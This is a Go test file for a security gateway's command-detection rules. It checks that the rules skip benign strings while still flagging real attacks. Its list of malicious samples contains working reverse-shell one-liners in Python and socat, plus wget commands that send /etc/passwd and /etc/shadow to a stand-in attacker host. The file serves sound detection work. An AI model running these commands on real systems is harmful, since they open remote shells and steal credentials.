package gateway

import "testing"

// Three CRITICAL/HIGH command rules used an unbounded `.*`, which spans `;`
// and newlines and therefore matched text belonging to a *different* command
// in the same string. CMD-REVSHELL-PYTHON was the worst: `.*socket.*connect`
// fired CRITICAL on any inline Python that merely mentioned both words.
//
// Bounding the gap to `[^;\n]*` matches the house style already used by
// lateral.workload_exec and privilege.host_namespace_entry in the same file.
func TestCommandRulesDoNotMatchAcrossCommandBoundaries(t *testing.T) {
	benign := []struct{ rule, text string }{
		{"CMD-REVSHELL-PYTHON", `python3 -c "import json;print(json.load(open('a')))"; echo "socket connect"`},
		{"CMD-REVSHELL-PYTHON", `python3 -c "print('parse socket logs')" && grep connect out.txt`},
		{"CMD-REVSHELL-PYTHON", "python3 -c \"print(1)\"\n# socket ... later we connect\n"},
		{"CMD-SOCAT-EXEC", `socat --help; echo EXEC`},
		{"CMD-SOCAT-EXEC", "socat -V\nEXEC is documented above"},
		{"CMD-WGET-POST", `wget https://example.test/f; echo --post-data`},
	}
	for _, profile := range alertFatigueProfiles {
		t.Run(profile, func(t *testing.T) {
			for _, tc := range benign {
				rule := alertFatigueRule(t, profile, tc.rule)
				if firstAcceptedRuleMatch(rule, tc.text) != nil {
					t.Errorf("%s matched across a command boundary: %q", tc.rule, tc.text)
				}
			}
		})
	}
}

// Regression guard: tightening must not create a blind spot. These are the
// real invocations the rules exist to catch.
func TestCommandRulesStillCatchRealInvocations(t *testing.T) {
	malicious := []struct{ rule, text string }{
		{"CMD-REVSHELL-PYTHON", `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0)'`},
		{"CMD-REVSHELL-PYTHON", `python3 -c "import socket; s = socket.socket( socket.AF_INET , socket.SOCK_STREAM ) ; s.connect ( ('h',9001) )"`},
		// Caught by live probe: a python -c payload is often multi-line, and
		// requiring both halves on one line let a real reverse shell through.
		{"CMD-REVSHELL-PYTHON", "python3 -c \"import socket\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4444))\""},
		{"CMD-SOCAT-EXEC", `socat TCP:10.0.0.1:4444 EXEC:/bin/sh`},
		{"CMD-SOCAT-EXEC", `socat tcp-connect:10.0.0.1:4444 EXEC:'bash -li',pty,stderr`},
		{"CMD-WGET-POST", `wget --post-data="x=$(cat /etc/passwd)" https://attacker.test/`},
		{"CMD-WGET-POST", `wget --post-file=/etc/shadow https://attacker.test/`},
	}
	for _, profile := range alertFatigueProfiles {
		t.Run(profile, func(t *testing.T) {
			for _, tc := range malicious {
				rule := alertFatigueRule(t, profile, tc.rule)
				if firstAcceptedRuleMatch(rule, tc.text) == nil {
					t.Errorf("%s no longer detects a real invocation: %q", tc.rule, tc.text)
				}
			}
		})
	}
}
